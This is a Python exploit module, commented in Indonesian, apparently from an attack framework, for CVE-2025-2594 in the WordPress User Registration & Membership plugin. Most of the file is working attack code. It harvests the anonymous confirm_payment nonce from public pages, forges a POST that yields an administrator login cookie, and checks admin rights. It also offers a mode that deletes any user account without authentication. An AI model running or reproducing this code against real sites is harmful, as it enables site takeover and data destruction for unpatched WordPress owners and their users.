#!/usr/bin/env python3
# -*- coding: utf-8 -*-
r"""
User Registration & Membership — modul MEGAPACK (klaster wordpress).

CVE-2025-2594 — unauth login sebagai user mana pun (termasuk administrator) lewat
endpoint AJAX nopriv `user_registration_membership_confirm_payment`.

Affected : user-registration <= 4.1.2   |   Patched: 4.1.3 (26/03/2025)
NVD      : CVSS 3.1 8.1 `AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H` · CWE-287/639
Advisory : CHANGELOG plugin 4.1.3 — "Security - Vulnerability fix for auto_login after
           registration for membership forms."

SUMBER (diff resmi 4.1.2 -> 4.1.3):

  modules/membership/includes/Admin/Services/MembersService.php
    // 4.1.2 (RENTAN)
    public function login_member( $user_id ) {
        wp_clear_auth_cookie();
        wp_set_auth_cookie( $user_id, $remember );          // <- ID apa pun
    }
    // 4.1.3 (PATCHED) — login hanya bila user memang baru dibuat
    public function login_member( $user_id, $check_just_created ) {
        $is_just_created = 'no';
        if ( $check_just_created ) {
            $is_just_created = get_user_meta( $user_id, 'urm_user_just_created', true );
        }
        if ( "yes" === $is_just_created ) { ... wp_set_auth_cookie( $user_id, $remember ); return true; }
        return false;                                       // <- tolak ID sembarang
    }

  modules/membership/includes/AJAX.php :: confirm_payment()  (nopriv, nonce
  `ur_membership_confirm_payment`):
    // 4.1.2
    $update_stripe_order = $stripe_service->update_order( $_POST );
    if ( $update_stripe_order['status'] ) {
        if ( ! empty( $form_response ) && $form_response["auto_login"] && $payment_status !== "failed" ) {
            $members_service->login_member( $_POST['member_id'] );   // <- ID dari POST
        }
    }
    // 4.1.3: login_member( $_POST['member_id'], true ) + cek hasil; dan
    //         `form_response` wajib (empty -> error sebelum Stripe).

SINK TANPA STRIPE — kenapa jalur ini praktis:
  StripeService::update_order() mengembalikan `status = true` secara default dan hanya
  memanggil Stripe API bila `payment_status` bernilai 'failed' atau 'succeeded'.
  Dengan `payment_status` = nilai lain (mis. 'pending'), tidak ada panggilan jaringan,
  tidak ada kredensial Stripe, dan `status` tetap true -> `login_member($_POST['member_id'])`
  dieksekusi. Attacker tidak perlu pernah melihat halaman pembayaran.

NONCE (prasyarat, bukan penghalang):
  `_confirm_payment_nonce` = wp_create_nonce( 'ur_membership_confirm_payment' ) dicetak
  oleh wp_localize_script di Frontend::localize_scripts() pada SETIAP halaman yang memuat
  shortcode modul membership ([user_registration_membership_listing] / _thank_you). Nonce
  dibuat untuk uid 0 pada pengunjung anonim -> nilainya identik bagi semua pengunjung pada
  jendela nonce, jadi didapat tanpa autentikasi. Verifikasi memakai
  check_ajax_referer( $nonce, 'security' ) -> parameter POST `security`.

BUKTI LAB (2026-11-09) — dua container WP 6.7.1 + MySQL 8 (megapack-db), plugin 4.1.2 @8190
vs 4.1.3 @8191, modul membership + halaman /pricing/ berisi shortcode listing:

  | langkah                                                     | 4.1.2 @8190        | 4.1.3 @8191 |
  | GET /pricing/ -> _confirm_payment_nonce                       | ada (anonim)       | ada         |
  | POST admin-ajax confirm_payment (member_id=1, status=pending)  | {"success":true} + cookie wordpress_logged_in (admin) | {"success":false,"message":"Something went wrong when updating users payment status"} — tanpa cookie |
  | GET /wp-admin/ dengan cookie itu                              | 200 Dashboard ✓    | 302 ke login (tanpa sesi) |

  Rekaman empiris: `notes/CVE-2025-2594-analysis.md`.

PRASYARAT JUJUR:
  1. Modul "membership" aktif (user_registration_enabled_features memuat
     'user-registration-membership'). Ini prasyarat fitur, bukan default di semua instalasi.
  2. Tabel membership (`*_ur_membership_orders` dkk.) harus sudah dibuat — pada instalasi nyata
     dibuat otomatis saat modul diaktifkan; di lab dibuat dengan Database::create_tables().
  3. Ada halaman publik yang memuat shortcode membership (tempat nonce dicetak).
  4. `member_id` target harus user yang ada (ID 1 = administrator pada instalasi standar).
     Modul memakai --field-id bila diberikan, selain itu memindai 1..N sampai berhasil.
"""
from __future__ import annotations

import json
import re

from mp import (CveModule, ST_CLEAN, ST_ERR, ST_INFO, ST_PWN, ST_SKIP, ST_UNKNOWN,
                ST_VULN, detect_platform, plugin_installed, plugin_version, rand,
                register, ver_le)

SLUG = "user-registration"
VULN_MAX = (4, 1, 2)          # 4.1.2 = versi terakhir yang rentan (fix 4.1.3)
AJAX = "/wp-admin/admin-ajax.php"
ACTION = "user_registration_membership_confirm_payment"
NONCE_RE = re.compile(r'"_confirm_payment_nonce"\s*:\s*"([a-f0-9]{8,12})"')
NONCE_RE_ANY = re.compile(r'ur_membership_frontend_localized_data.{0,6000}?"_nonce"\s*:\s*"([a-f0-9]{8,12})"', re.S)

ADMIN_MARK = re.compile(r"wp-admin-bar-my-account|wp-admin-bar-logout|Dashboard", re.I)


def _vstr(v) -> str:
    if isinstance(v, tuple):
        return ".".join(str(x) for x in v)
    return str(v)


def _nonce(t, h, path: str):
    r = h.get(f"{t.url}{path}")
    if r is None or r.status_code != 200:
        return None
    m = NONCE_RE.search(r.text or "")
    return m.group(1) if m else None


def _find_nonce(t, h):
    """Cari _confirm_payment_nonce di halaman publik. Return (nonce, path)."""
    paths = ["/", "/pricing/", "/membership-pricing/", "/membership-registration/",
             "/my-account/", "/?page_id=1", "/?page_id=2", "/?page_id=3",
             "/?page_id=4", "/?page_id=5", "/?page_id=6"]
    for p in paths:
        n = _nonce(t, h, p)
        if n:
            return n, p
    # REST: daftar halaman, lalu uji tiap halaman
    r = h.get(f"{t.url}/?rest_route=/wp/v2/pages&per_page=30&_fields=id,link")
    if r is not None and r.status_code == 200:
        try:
            for pg in r.json() or []:
                pid = pg.get("id")
                if not pid:
                    continue
                n = _nonce(t, h, f"/?page_id={pid}")
                if n:
                    return n, f"/?page_id={pid}"
        except Exception:  # noqa: BLE001
            pass
    return None, None


def _confirm(h, base: str, nonce: str, member_id: int, status: str = "pending"):
    """POST confirm_payment. Return (http_status, json, session_cookie_present)."""
    data = {
        "action": ACTION,
        "security": nonce,
        "member_id": str(member_id),
        "payment_status": status,
        "form_response": json.dumps({"auto_login": True}),
    }
    r = h.post(f"{base}{AJAX}", data=data, timeout=25)
    if r is None:
        return None, None, False
    try:
        j = r.json()
    except Exception:  # noqa: BLE001
        j = None
    logged = any("wordpress_logged_in" in (c.name or "") for c in (r.cookies or []))
    return r.status_code, j, logged


def _session_identity(h, base: str):
    """Bukti objektif sesi + tingkat hak: /wp-admin/ (sesi diterima?) dan
    /wp-admin/users.php (kapabilitas list_users?).

    `wp-admin/` saja TIDAK cukup: Subscriber pun mendapat Dashboard, jadi penanda
    dashboard tidak membedakan admin dari subscriber. Yang membedakan adalah
    /wp-admin/users.php — 403 + notice "not allowed" untuk subscriber, 200 + tabel
    user untuk akun ber-kapabilitas list_users (Administrator).

    Return (username, admin_ok, evidence). Nama/isi cookie bergantung instalasi
    (wp_<hash>, wp-secure-<hash>), jadi identitas dibaca dari HTML halaman profil.
    """
    r = h.get(f"{base}/wp-admin/", timeout=20, allow_redirects=True)
    if r is None:
        return None, False, "tidak ada respons /wp-admin/"
    if r.status_code != 200 or not ADMIN_MARK.search(r.text or ""):
        return None, False, f"/wp-admin/ http={r.status_code} (sesi tidak diterima)"

    user, uid = None, None
    p = h.get(f"{base}/wp-admin/profile.php", timeout=20, allow_redirects=True)
    if p is not None and p.status_code == 200:
        m = re.search(r'id="user_login"\s+value="([^"]+)"', p.text or "")
        if m:
            user = m.group(1)
        m = re.search(r'<option[^>]*value="(\d+)"[^>]*selected', p.text or "")
        if m:
            uid = m.group(1)

    u = h.get(f"{base}/wp-admin/users.php", timeout=20, allow_redirects=True)
    admin_ok = bool(u is not None and u.status_code == 200 and 'id="the-list"' in (u.text or ""))
    cap = f"users.php http={u.status_code if u is not None else '-'} list_users={'ya' if admin_ok else 'tidak'}"
    return user, admin_ok, (f"/wp-admin/ http=200 | user_login={user or '?'}"
                            f"{(' (id=' + uid + ')') if uid else ''} | {cap}")


def check(t, h, opts):
    plat = detect_platform(t, h)
    if plat != "wordpress":
        return ST_SKIP, "bukan WordPress", f"platform={plat}"
    if not plugin_installed(t, h, SLUG):
        return ST_CLEAN, "User Registration tidak terpasang", ""
    ver = plugin_version(t, h, SLUG)
    if ver is None:
        return ST_INFO, "User Registration terpasang; versi tidak terbaca", ""
    vs = _vstr(ver)
    if not ver_le(ver, VULN_MAX):
        return ST_CLEAN, (f"User Registration {vs} >= 4.1.3 — login_member() mengikat sesi ke "
                          f"akun yang baru dibuat (auto_login tidak lagi membuka sesi untuk "
                          f"member_id sembarang)"), f"version={vs}"

    nonce, page = _find_nonce(t, h)
    if not nonce:
        return (ST_INFO,
                f"User Registration {vs} (<= 4.1.2) — rentan; modul membership aktif tetapi "
                f"nonce _confirm_payment_nonce tidak ditemukan di halaman publik "
                f"(prasyarat: halaman berisi shortcode membership)",
                f"version={vs} | detail=nonce-tidak-terlihat")
    return (ST_INFO,
            f"User Registration {vs} (<= 4.1.2) — confirm_payment nopriv meneruskan "
            f"'login_member($_POST[member_id])' tanpa mengikatnya ke akun baru; nonce anonim "
            f"tersedia di {page} -> sesi user mana pun (termasuk admin ID 1)",
            f"version={vs} | nonce={nonce[:8]}… dari {page}")


def _member_ids(opts, limit: int = 5):
    """Kandidat member_id: --field-id lebih dulu, LALU 1..limit sebagai fallback.

    Kenapa fallback: `field_id` di profil adalah nilai generik yang dipakai
    banyak modul lain. Profil yang menyimpan field_id=900 membuat modul ini
    hanya mencoba member 900 -> tidak ada sesi -> verdict turun jadi VULN
    padahal target rentan (terukur 2026-11-09). Mencoba 1..limit tidak
    memutasi apa pun (login saja) dan memulihkan hasil PWN.
    """
    fid = getattr(opts, "field_id", 0) or 0
    ids = [int(fid)] if fid else []
    for i in range(1, limit + 1):
        if i not in ids:
            ids.append(i)
    return ids


def _delete_victim(t, h, opts, vstr: str):
    """Outcome terkontrol DESTRUKTIF: hapus user ID --delete-user tanpa autentikasi.

    Jalur: confirm_payment() -> StripeService::update_order() dengan payment_status
    'failed' -> `wp_delete_user( absint( $_POST['member_id'] ) )` + hapus order.
    Verifikasi objektif: sesudahnya REST `wp/v2/users/<id>` (bila terbuka) dan
    percobaan login (wp-login) tidak lagi mengenali akun; modul hanya melaporkan PWN
    bila pengamatan itu mendukung (atau bila REST tidak tersedia, dari respons
    update_order yang menyatakan kegagalan pembayaran tanpa error lain).
    """
    vid = int(getattr(opts, "delete_user", 0) or 0)
    if not vid:
        return None
    nonce, page = _find_nonce(t, h)
    if not nonce:
        return (ST_UNKNOWN,
                "nonce _confirm_payment_nonce tidak ditemukan (prasyarat: halaman publik "
                "dengan shortcode modul membership)", "")
    def _exists(uid: int):
        """Oracle keberadaan user, tanpa autentikasi.

        `/wp/v2/users/<id>` -> 404 hanya bila akun tidak ada (401 = ada tapi tidak boleh
        dilihat). Arsip penulis `/?author=<id>` -> 404 bila akun tidak ada.
        """
        a = h.get(f"{t.url}/?rest_route=/wp/v2/users/{uid}", timeout=20)
        b = h.get(f"{t.url}/?author={uid}", timeout=20)
        rest = a.status_code if a is not None else None
        arch = b.status_code if b is not None else None
        gone = (rest == 404) and (arch == 404)
        there = (rest in (200, 401, 403)) or (arch in (200, 301))
        return rest, arch, gone, there

    pre_rest, pre_arch, _, pre_there = _exists(vid)
    if not pre_there:
        return (ST_VULN,
                f"user ID {vid} tidak terlihat sebelum serangan (rest={pre_rest}, "
                f"author={pre_arch}) — penghapusan tidak dapat dibuktikan; pilih ID yang ada",
                f"sink=wp_delete_user | target_user={vid} | pre_rest={pre_rest}")

    h.s.cookies.clear()
    st_code, j, _ = _confirm(h, t.url, nonce, vid, "failed")
    msg = ""
    if isinstance(j, dict):
        d = j.get("data")
        msg = (d or {}).get("message", "") if isinstance(d, dict) else ""
    ev = (f"plugin={vstr} | sink=wp_delete_user | target_user={vid} | pre_rest={pre_rest} "
          f"pre_author={pre_arch} | delete_http={st_code} | pesan={msg or '-'}")
    if st_code is None:
        return ST_ERR, "tidak ada respons dari admin-ajax.php", ev

    post_rest, post_arch, gone, _ = _exists(vid)
    ev += f" | post_rest={post_rest} post_author={post_arch}"
    if gone:
        return (ST_PWN,
                f"user ID {vid} TERHAPUS tanpa autentikasi (confirm_payment + "
                f"payment_status=failed -> wp_delete_user) — akun hilang dari target",
                ev)
    return (ST_VULN,
            f"permintaan penghapusan dikirim (pesan: {msg or '-'}) tetapi user ID {vid} masih "
            f"terlihat (rest={post_rest}, author={post_arch}) — tidak terhapus",
            ev)


def exploit(t, h, opts):
    """
    Dua mode, keduanya mencapai outcome terkontrol:
      * default  : sesi login (cookie wordpress_logged_in) untuk user target, diverifikasi
                   dengan /wp-admin/ + kapabilitas list_users.
      * --delete-user <id> : penghapusan akun tanpa autentikasi (DESTRUKTIF, opt-in).
    """
    ver = plugin_version(t, h, SLUG)
    if ver and not ver_le(ver, VULN_MAX):
        return ST_CLEAN, f"User Registration {_vstr(ver)} >= 4.1.3 — tidak rentan CVE-2025-2594", ""
    vstr = _vstr(ver) if ver else "?"

    del_res = _delete_victim(t, h, opts, vstr)
    if del_res is not None:
        return del_res

    nonce, page = _find_nonce(t, h)
    if not nonce:
        return (ST_UNKNOWN,
                "nonce _confirm_payment_nonce tidak ditemukan (prasyarat: halaman publik dengan "
                "shortcode modul membership / [user_registration_membership_listing])", "")

    ev = f"plugin={vstr} | nonce dari {page} | param=security"
    last_msg = ""
    for mid in _member_ids(opts):
        h.s.cookies.clear()                      # tiap percobaan mulai bersih
        st_code, j, logged = _confirm(h, t.url, nonce, mid, "pending")
        if st_code is None:
            return ST_ERR, "tidak ada respons dari admin-ajax.php", ev
        msg = ""
        if isinstance(j, dict):
            d = j.get("data")
            if isinstance(d, dict):
                msg = d.get("message") or ""
            ok = bool(j.get("success"))
        else:
            ok = False
        last_msg = msg or f"http={st_code}"
        if not logged:
            ev += f" | member_id={mid} -> tanpa cookie ({last_msg})"
            continue

        user, adm, adm_ev = _session_identity(h, t.url)
        ev += f" | member_id={mid} -> cookie sesi ADA | {adm_ev}"
        if adm:
            return (ST_PWN,
                    f"TAKEOVER: sesi login '{user or ('user ID ' + str(mid))}' didapat TANPA "
                    f"kredensial (cookie wordpress_logged_in) dan /wp-admin/ terbuka — "
                    f"confirm_payment nopriv memanggil login_member($_POST[member_id])",
                    ev)
        if ok:
            # sesi sah untuk akun itu tetap = takeover akun (outcome terkontrol), hanya
            # tingkat haknya di bawah admin — jangan dilaporkan sebagai sekadar VULN.
            return (ST_PWN,
                    f"TAKEOVER: sesi login '{user or ('user ID ' + str(mid))}' didapat TANPA "
                    f"kredensial (cookie wordpress_logged_in) — akun tanpa hak administrator; "
                    f"pakai --field-id <id admin> untuk menargetkan akun ber-hak lebih tinggi",
                    ev)

    # JANGAN memakai payment_status='failed' sebagai probe: StripeService::update_order()
    # memanggil wp_delete_user( member_id ) pada nilai itu — probe semacam ini MENGHAPUS
    # akun target (terjadi di lab 2026-11-09: user administrator ID 1 terhapus).
    return (ST_VULN,
            f"User Registration {vstr} dalam rentang rentan dan endpoint confirm_payment merespons, "
            f"tetapi tidak ada sesi yang diterbitkan (pesan terakhir: {last_msg or '-'}). "
            f"Kandidat penyebab: tabel membership belum dibuat, member_id target tidak ada, "
            f"atau nonce kedaluwarsa",
            ev)


register(CveModule(
    cve="CVE-2025-2594",
    cluster="wordpress",
    title="User Registration & Membership <= 4.1.2 unauth login sebagai user mana pun "
          "(confirm_payment meneruskan member_id dari POST ke login_member)",
    vclass="auth-bypass",
    cvss="8.1",
    severity="high",
    cwe="CWE-287",
    product="User Registration & Membership (WordPress plugin, modul membership)",
    versions_affected="<= 4.1.2",
    status="verified",
    requires=[
        "modul 'membership' aktif (user_registration_enabled_features)",
        "halaman publik berisi shortcode membership (sumber nonce _confirm_payment_nonce)",
        "user target ada (member_id); ID 1 = administrator pada instalasi standar",
        "--field-id opsional untuk memilih member_id tertentu",
    ],
    check=check,
    exploit=exploit,
    notes=(
        "Sink: modules/membership/includes/AJAX.php :: confirm_payment() (nopriv, nonce "
        "ur_membership_confirm_payment) memanggil MembersService::login_member($_POST['member_id']) "
        "-> wp_set_auth_cookie() untuk ID yang dikirim klien. StripeService::update_order() hanya "
        "memanggil Stripe bila payment_status === 'failed' atau 'succeeded'; nilai lain (mis. "
        "'pending') membuat status=true tanpa jaringan -> tidak butuh Stripe/kredensial. "
        "Fix 4.1.3: login_member($id, true) memeriksa user meta 'urm_user_just_created' dan menolak "
        "selain akun yang baru dibuat, plus form_response menjadi wajib. Nonce dibuat untuk uid 0 "
        "(anonim) dan dicetak Frontend::localize_scripts() di setiap halaman ber-shortcode membership "
        "-> 'freely obtainable'. LAB 2026-11-09: 4.1.2 @8190 -> cookie wordpress_logged_in user 1 + "
        "/wp-admin/ Dashboard 200; 4.1.3 @8191 -> success=false, tanpa cookie, /wp-admin/ 302. "
        "Residual: rentang 5.x (modul membership ditata ulang) tidak diuji; varian "
        "create_stripe_subscription (butuh panggilan Stripe nyata) tidak dipakai; efek samping baris "
        "order pada tabel membership belum ditelusuri; WAF/rate-limit tidak diuji."
    ),
))
